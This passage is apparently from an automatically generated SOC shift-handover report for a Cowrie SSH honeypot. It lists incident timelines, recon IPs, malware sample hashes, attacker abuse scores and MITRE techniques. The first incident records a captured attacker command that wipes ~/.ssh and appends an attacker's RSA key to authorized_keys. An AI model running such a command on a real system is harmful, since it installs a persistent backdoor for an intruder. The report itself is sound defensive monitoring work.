| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:45:18` | `cowrie.session.connect` |
| `2026-05-02 20:45:18` | `cowrie.client.version` |
| `2026-05-02 20:45:19` | `cowrie.client.kex` |
| `2026-05-02 20:45:19` | `cowrie.login.success` |
| `2026-05-02 20:45:19` | `cowrie.session.params` |
| `2026-05-02 20:45:19` | `cowrie.command.input` |
| `2026-05-02 20:45:19` | `cowrie.command.failed` |
| `2026-05-02 20:45:19` | `cowrie.log.closed` |
| `2026-05-02 20:45:19` | `cowrie.session.params` |
| `2026-05-02 20:45:19` | `cowrie.command.input` |
| `2026-05-02 20:45:20` | `cowrie.session.file_download` |
| `2026-05-02 20:45:20` | `cowrie.log.closed` |
| `2026-05-02 20:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5ff9159e25

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:45 |
| **Last Seen** | 2026-05-02 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:45:21` | `cowrie.session.connect` |
| `2026-05-02 20:45:21` | `cowrie.client.version` |
| `2026-05-02 20:45:21` | `cowrie.client.kex` |
| `2026-05-02 20:45:22` | `cowrie.login.success` |
| `2026-05-02 20:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `171.244.37[.]96` | **23** | 2026-05-02 20:19 | 2026-05-02 20:48 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `135.237.125[.]221` | **2** | 2026-05-02 19:49 | 2026-05-02 19:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.47.8[.]188` | 1 | 2026-05-02 19:33 | 2026-05-02 19:33 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.74.38[.]239` | 1 | 2026-05-02 19:45 | 2026-05-02 19:45 | 10s | 0 | `T1592` | 🟢 LOW |
| `157.10.253[.]39` | 1 | 2026-05-02 20:14 | 2026-05-02 20:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.227.200[.]121` | 1 | 2026-05-02 20:44 | 2026-05-02 20:44 | 13s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]62` | 1 | 2026-05-02 19:26 | 2026-05-02 19:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `8.208.25[.]163` | 1 | 2026-05-02 19:47 | 2026-05-02 19:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]106` | 1 | 2026-05-02 19:12 | 2026-05-02 19:12 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]108` | 1 | 2026-05-02 19:12 | 2026-05-02 19:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]52` | 1 | 2026-05-02 19:15 | 2026-05-02 19:15 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.196.152[.]108` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `8.208.25[.]163` | GB | Aliyun Computing Co.LTD | **100** ⚠️ | 50 |
| `101.47.8[.]188` | SG | BYTEPLUS | **100** ⚠️ | 50 |
| `112.74.38[.]239` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `157.10.253[.]39` | ID | PT Bumi Saka Asri | **100** ⚠️ | 28 |
| `213.177.179[.]62` | NL | wcd | **100** ⚠️ | 50 |
| `210.227.200[.]121` | JP | Open Computer Network | **100** ⚠️ | 9 |
| `91.231.89[.]52` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `91.196.152[.]106` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `171.244.37[.]96` | VN | Viettel Group | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 32 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 25 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 102 cases |
| Tool 34  | Credential Extractor        | ✅ 57 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (35.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 32 priority case(s) shown individually · 11 recon entry/entries in table (2 group(s) consolidating 25 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-02T20:49:31Z_
